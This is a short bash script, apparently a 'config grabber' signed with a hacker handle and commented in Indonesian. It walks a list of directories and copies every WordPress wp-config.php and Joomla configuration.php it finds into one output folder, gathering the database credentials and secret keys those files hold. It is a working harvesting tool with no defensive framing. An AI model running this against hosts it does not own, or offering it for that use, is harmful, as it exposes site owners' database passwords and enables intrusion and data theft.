#!/bin/bash
echo "CREATE BY MATIGAN1337"
echo "-----------------------"

# Membuat folder baru untuk menyimpan output file
output_folder="config_outputs"
mkdir -p "$output_folder"

# Loop melalui setiap direktori pengguna yang telah ditentukan sebelumnya
while IFS= read -r directory; do
  config_path_wp="$directory/wp-config.php"
  config_path_joomla="$directory/configuration.php"
  
  # Mengecek apakah file wp-config.php ada
  if [ -f "$config_path_wp" ]; then
    # Menyimpan output file untuk WordPress dengan nama [directory]-WP-config.txt
    output_file_wp="$output_folder/${directory//\//-}-WP-config.txt"
    
    echo "WordPress Config for directory $directory:" >> "$output_file_wp"
    cat "$config_path_wp" >> "$output_file_wp"
    echo "----------------------------------" >> "$output_file_wp"
  fi

  # Mengecek apakah file configuration.php ada
  if [ -f "$config_path_joomla" ]; then
    # Menyimpan output file untuk Joomla dengan nama [directory]-JOOMLA-config.txt
    output_file_joomla="$output_folder/${directory//\//-}-JOOMLA-config.txt"
    
    echo "Joomla Config for directory $directory:" >> "$output_file_joomla"
    cat "$config_path_joomla" >> "$output_file_joomla"
    echo "----------------------------------" >> "$output_file_joomla"
  fi
done < "list_file.txt"

echo "Script telah selesai. Output disimpan dalam folder $output_folder"
